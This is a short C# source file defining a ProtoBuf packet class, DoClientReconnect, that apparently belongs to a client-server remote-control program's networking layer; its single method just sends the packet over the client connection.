using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoClientReconnect : IPacket
    {
        public DoClientReconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}